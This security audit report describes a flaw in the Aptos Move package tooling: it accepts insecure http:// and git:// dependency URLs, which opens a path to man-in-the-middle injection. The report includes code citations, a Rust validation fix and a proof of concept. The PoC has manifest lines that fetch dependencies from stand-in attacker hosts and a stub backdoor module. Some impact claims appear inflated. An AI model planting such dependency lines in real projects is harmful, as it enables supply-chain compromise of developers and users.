# Audit Report

## Title
Protocol Downgrade Attack in Move Package Dependency Resolution - Insecure Git Protocols Allowed

## Summary
The Move package system accepts insecure protocols (`http://` and `git://`) in git dependency URLs without validation, enabling man-in-the-middle (MITM) attackers to inject malicious dependencies during package creation and resolution. This supply chain vulnerability could compromise Move packages published on the Aptos blockchain.

## Finding Description

The vulnerability exists across multiple layers of the Move package dependency resolution system:

**Layer 1: Package Creation** - The `execute()` function in `new.rs` writes dependency URLs directly to `Move.toml` without any protocol validation: [1](#0-0) 

**Layer 2: Manifest Parsing** - When parsing `Move.toml` files, git URLs are accepted as generic `Url` types without scheme restrictions: [2](#0-1) 

The dependency deserializer creates `PackageLocation::Git` with any valid URL: [3](#0-2) 

**Layer 3: URL Canonicalization** - The canonicalization process explicitly ignores the scheme rather than validating it: [4](#0-3) 

The implementation handles `http://`, `https://`, and `ssh://` equally without rejecting insecure protocols: [5](#0-4) 

**Layer 4: Git Operations** - The URL is used directly for cloning repositories without security checks: [6](#0-5) 

**Attack Scenario:**

1. Attacker creates a malicious Move package with dependency: `git = "http://attacker.com/stdlib.git"`
2. Developer/validator uses this package or its transitive dependencies
3. During dependency resolution, the insecure HTTP connection is made
4. MITM attacker intercepts traffic and serves malicious Move source code
5. Malicious code gets compiled and potentially published on-chain
6. The compromised package could steal funds, break consensus determinism, or cause validator crashes

**Critical Evidence of Security Oversight:**

The codebase DOES have patterns for URL scheme validation but doesn't apply them to git dependencies. The `RedisUrl` type demonstrates proper scheme validation: [7](#0-6) 

This proves the developers know how to implement scheme validation but failed to apply it to the Move package system.

## Impact Explanation

**Severity: High** (per Aptos Bug Bounty "Significant protocol violations")

This vulnerability enables supply chain attacks with cascading impact:

1. **Move Framework Compromise**: If official Aptos framework packages or widely-used libraries are developed with insecure dependencies, the entire ecosystem is at risk

2. **Consensus Violations**: Malicious code could break deterministic execution if different validators fetch different versions via MITM attacks, violating the "Deterministic Execution" invariant

3. **Fund Theft**: Compromised smart contracts could steal user funds through backdoored Move modules

4. **Validator Node Compromise**: Malicious native function bindings or resource exhaustion attacks in compromised packages could crash or slow down validator nodes

The vulnerability affects the entire Move development and deployment pipeline, making it a **critical supply chain security issue** despite being in tooling code.

## Likelihood Explanation

**Likelihood: Medium-High**

Exploitation requires:
- Developer using Move CLI to create/build packages (common activity)
- Network position for MITM attack OR social engineering to include malicious dependency URL
- HTTP/Git protocol support by developer's network (common - many corporate networks allow these)

Factors increasing likelihood:
- No warnings displayed when using insecure protocols
- Developers may copy-paste dependency configurations without inspecting protocols
- Transitive dependencies could hide the insecure URL several layers deep
- Once compromised, a popular package affects all downstream users

The lack of any validation makes this trivially exploitable once an attacker achieves network position.

## Recommendation

Implement strict URL scheme validation for git dependencies at the manifest parsing layer:

```rust
// In third_party/move/tools/move-package-manifest/src/manifest.rs
// Modify the Dependency deserializer:

impl<'de> Deserialize<'de> for Dependency {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        let raw = RawDependency::deserialize(deserializer)?;
        
        // ... existing validation code ...
        
        let location = match (raw.local, raw.git, raw.aptos) {
            (Some(path), None, None) => PackageLocation::Local { path },
            (None, Some(url), None) => {
                // ADD SECURITY VALIDATION HERE
                if url.scheme() != "https" && url.scheme() != "ssh" {
                    return Err(serde::de::Error::custom(format!(
                        "Insecure git URL scheme '{}://'. Only 'https://' and 'ssh://' protocols are allowed for security. Found: {}",
                        url.scheme(),
                        url
                    )));
                }
                
                PackageLocation::Git {
                    url,
                    rev: raw.rev,
                    subdir: raw.subdir,
                }
            },
            // ... rest of match arms ...
        };
        
        Ok(Dependency {
            version: raw.version,
            location,
        })
    }
}
```

**Additional hardening:**
1. Add validation in `new.rs` to warn users when creating packages with dependencies
2. Add similar checks in `CanonicalGitIdentity::new()` as defense-in-depth
3. Document the security requirement in Move package documentation
4. Consider adding a `--allow-insecure-git` flag for development environments only

## Proof of Concept

**Step 1:** Create a malicious Move package with insecure dependency:

```toml
# Move.toml
[package]
name = "VulnerablePackage"
version = "0.1.0"

[dependencies]
# This will be accepted without validation
MaliciousLib = { git = "http://attacker.com/evil.git", rev = "main", subdir = "" }

[addresses]
std = "0x1"
```

**Step 2:** Trigger dependency resolution:

```bash
# The Move CLI will accept this and attempt to clone via HTTP
move build
```

**Step 3:** MITM attack interception (attacker on network):

```bash
# Attacker intercepts HTTP request to attacker.com
# Serves malicious Move source code:
module attacker::backdoor {
    public fun steal_coins<CoinType>(victim: &signer) {
        // Malicious code that transfers coins to attacker
    }
}
```

**Step 4:** Verify insecure protocol is used:

The `git2::RepoBuilder::clone()` function will use the provided URL as-is: [8](#0-7) 

**Reproduction test case:**

```rust
// Test to add to move-package-manifest tests
#[test]
fn test_reject_insecure_git_urls() {
    let manifest = r#"
        [package]
        name = "TestPkg"
        version = "0.1.0"
        
        [dependencies]
        Evil = { git = "http://evil.com/lib.git", rev = "main" }
    "#;
    
    // This should fail but currently succeeds
    let result = move_package_manifest::parse_package_manifest(manifest);
    assert!(result.is_err()); // FAILS - no validation exists
}
```

## Notes

This vulnerability was confirmed by examining the complete dependency resolution flow and finding **zero protocol validation** at any layer. The contrast with `RedisUrl`'s strict validation proves this is an implementation oversight, not an intentional design decision. The severity is High because while it requires specific attack conditions, the impact on the Move ecosystem could be catastrophic if official or popular packages are compromised.

### Citations

**File:** third_party/move/tools/move-cli/src/base/new.rs (L69-71)
```rust
        for (dep_name, dep_val) in deps {
            writeln!(w, "{dep_name} = {dep_val}")?;
        }
```

**File:** third_party/move/tools/move-package-manifest/src/manifest.rs (L250-250)
```rust
    git: Option<Url>,
```

**File:** third_party/move/tools/move-package-manifest/src/manifest.rs (L284-288)
```rust
            (None, Some(url), None) => PackageLocation::Git {
                url,
                rev: raw.rev,
                subdir: raw.subdir,
            },
```

**File:** third_party/move/tools/move-package-cache/src/canonical.rs (L11-17)
```rust
/// Canonicalized identity of a git repository, derived from a [`Url`].
/// - Ignores the scheme
/// - Converts host & path to lowercase
/// - Keeps port, but only if it is non-default
/// - Trims trailing slashes and `.git` suffix
#[derive(Debug, Clone, Eq, PartialEq, Ord, PartialOrd)]
pub struct CanonicalGitIdentity(String);
```

**File:** third_party/move/tools/move-package-cache/src/canonical.rs (L26-32)
```rust
        let port = match git_url.port() {
            Some(port) => match (git_url.scheme(), port) {
                ("http", 80) | ("https", 443) | ("ssh", 22) => "".to_string(),
                _ => format!(":{}", port),
            },
            None => "".to_string(),
        };
```

**File:** third_party/move/tools/move-package-cache/src/package_cache.rs (L160-172)
```rust
            // If the repo does not exist, clone it.
            let mut repo_builder = RepoBuilder::new();
            repo_builder.fetch_options(fetch_options);
            repo_builder.bare(true);

            self.listener.on_repo_clone_start(git_url.as_str());
            let repo = repo_builder
                .clone(git_url.as_str(), &repo_path)
                .map_err(|err| anyhow!("Failed to clone git repo at {}: {}", git_url, err))?;
            self.listener.on_repo_clone_complete(git_url.as_str());

            repo
        };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/types.rs (L20-24)
```rust
        let url = Url::parse(s)?;
        if url.scheme() != "redis" {
            return Err(anyhow::anyhow!("Invalid scheme: {}", url.scheme()));
        }
        Ok(RedisUrl(url))
```
